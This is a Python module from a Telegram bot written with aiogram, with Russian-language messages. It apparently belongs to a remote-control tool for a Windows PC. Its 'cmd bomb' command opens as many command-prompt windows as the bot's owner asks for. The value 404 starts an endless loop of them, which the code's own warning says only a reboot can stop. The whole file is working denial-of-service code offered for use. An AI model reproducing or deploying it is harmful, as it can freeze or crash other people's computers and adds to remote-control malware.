##  _________________________________________
##   |_______  authors: Eks1azy  _______| 
##    \_\_\_|______  Oqwe4O  _______|\_\_\_\
##           \_\_\_\_\_\_\_\_\_\_\_\                    
##  ___________________________________________
##  |                                          /\
##  |  github:https://github.com/Eks1azy   / /
##  |                                        / / 
##  |    if you will find some bugs or      / /
##  |                                      / /
##  |    have ideas for improvements,     / /
##  |                                    / /
##  |       please send it to me        / /
##  |__________________________________/ /
##  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_/


from aiogram import types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from config import ALLOWED_USER_ID
from lib.states import CMDBOOM

import subprocess

def register_cmd_bomb(dp):
    @dp.message(F.text.lower() == "cmd бомба")
    @dp.message(Command("cmd_boom"))
    async def start_decipher(message: types.Message, state: FSMContext):
        if message.from_user.id == ALLOWED_USER_ID:
            await message.answer("Осторожно \nЕсли запустить эту команду бесконечно, поможет только перезагрузка ПК.\nВведи сколько раз хочешь открыть консоль: \nЕсли хочешь бесконечно, то введи 404")
            await state.set_state(CMDBOOM.waiting_CMD)
        else:
            await message.answer("К сожалению, у вас нет доступа к этому боту.")

    @dp.message(CMDBOOM.waiting_CMD)
    async def process_file_path(message: types.Message, state: FSMContext):
        if message.from_user.id == ALLOWED_USER_ID:
            try:
                BOOM = int(message.text)

                if BOOM < 0:
                    await message.answer("Количество должно быть неотрицательным. Пожалуйста, попробуйте снова.")
                    return
                elif BOOM == 404:
                    # Бесконечный запуск командных строк
                    while True:
                        subprocess.Popen('start cmd', shell=True)
                else:
                    # Запускаем BOOM раз
                    for _ in range(BOOM):
                        subprocess.Popen('start cmd', shell=True)
                    await state.clear()

                await message.answer("Консоли открыты.")

            except ValueError:
                await message.answer("Пожалуйста, введите корректное число.")
            except Exception as e:
                await message.answer(f"Произошла ошибка: {str(e)}")
        else:
            await message.answer("К сожалению, у вас нет доступа к этому боту.")